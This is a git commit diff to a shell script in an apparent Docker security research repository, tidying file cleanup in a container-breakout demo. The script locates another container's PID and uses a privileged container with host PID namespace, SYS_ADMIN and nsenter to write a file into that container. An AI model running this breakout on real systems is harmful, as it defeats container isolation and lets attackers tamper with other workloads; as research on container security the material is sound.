2261dc931c52fe22a0a5b45e03ed2e1bf998c1c3
Ubuntu <ubuntu@docker-security22.novalocal>
2019-01-12 19:46:44 +0000

    Small change at deleting files

--- Attacks/Nsenter/Breakout_to_Other_Container/write_to_container/2_run_attacker_to_container.sh
+++ Attacks/Nsenter/Breakout_to_Other_Container/write_to_container/2_run_attacker_to_container.sh
@@ -6,10 +6,10 @@ cut -d' ' -f1 dockerps > containerid
 container_id=$(cat containerid)
 docker inspect --format {{.State.Pid}} ${container_id} > PID
 container_pid=$(cat PID)
-rm PID
 
 #Attack container
 docker run --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN --rm -it debian:latest nsenter --target ${container_pid} --mount touch HelloFromTheOtherSide
 
-sudo rm dockerps
-sudo rm containerid
+rm PID
+rm dockerps
+rm containerid
